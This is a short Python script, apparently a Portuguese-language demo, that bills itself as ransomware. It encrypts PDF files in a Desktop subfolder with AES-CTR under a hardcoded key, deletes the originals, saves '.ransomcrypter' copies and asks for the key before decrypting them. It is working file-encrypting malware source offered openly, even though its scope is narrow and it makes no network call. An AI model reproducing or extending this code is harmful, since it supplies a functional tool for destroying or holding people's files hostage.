import os
import glob
import time
from tkinter import font
import pyaes
from pathlib import Path
from pyfiglet import figlet_format

# Extensão de arquivos alvos
lst_arq = ["*.pdf"]

# Entra no Desktop e faz a verificação
try:
    desktop = Path.home() / "Desktop/Nova pasta"
#    download = Path.home() / "Downloads"
except Exception:
    pass

os.chdir(desktop)

# Função de logo
def title():
    print("===========================================================")
    print(figlet_format("Ransomwareº ", font="standard"))
    print("===========================================================")

# Função de criptografia dos arquivos
def criptografando():
    print('Criptografando...\n')
    for files in lst_arq:
        for format_file in glob.glob(files):
            print(format_file)
            f = open(f'{desktop}\\{format_file}', 'rb')
            file_data = f.read()
            f.close()

            os.remove(f'{desktop}\\{format_file}')
            key = b"1ab2c3e4f5g6h7i8"  # 16 byts key - chave
            aes = pyaes.AESModeOfOperationCTR(key)
            crypto_data = aes.encrypt(file_data)

            # Salvando arquivo novo (.ransomcrypter)
            new_file = format_file + ".ransomcrypter"
            new_file = open(f'{desktop}\\{new_file}', 'wb')
            new_file.write(crypto_data)
            new_file.close()

# Função de descriptografia dos arquivos
def descrypt(decrypt_file):
    try:
        for file in glob.glob('*.ransomcrypter'):

            keybytes = decrypt_file.encode()
            name_file = open(file, 'rb')
            file_data = name_file.read()
            dkey = keybytes  # 16 bytes key - change for your key
            daes = pyaes.AESModeOfOperationCTR(dkey)
            decrypt_data = daes.decrypt(file_data)

            format_file = file.split('.')
            new_file_name = format_file[0] + '.' + format_file[1]  # Path to drop file

            dnew_file = open(f'{desktop}\\{new_file_name}', 'wb')
            dnew_file.write(decrypt_data)
            dnew_file.close()
    except ValueError as err:
        print('Chave inválida')


if __name__ == '__main__':
    title()
    criptografando()
    while True:
        if criptografando:
            key = input('\nSeus dados foram criptografados, para desbloquear informe a chave de acesso: ')
            if key == '1ab2c3e4f5g6h7i8':
                descrypt(key)
                for del_file in glob.glob('*.ransomcrypter'):
                    os.remove(f'{desktop}\\{del_file}')
                print('\033[32m'+"Seus dados foram recuperados com sucesso!\n"+'\033[0;0m')
                break
            else:
                print('\033[31m'+"Acesso negado!\n"+'\033[0;0m')

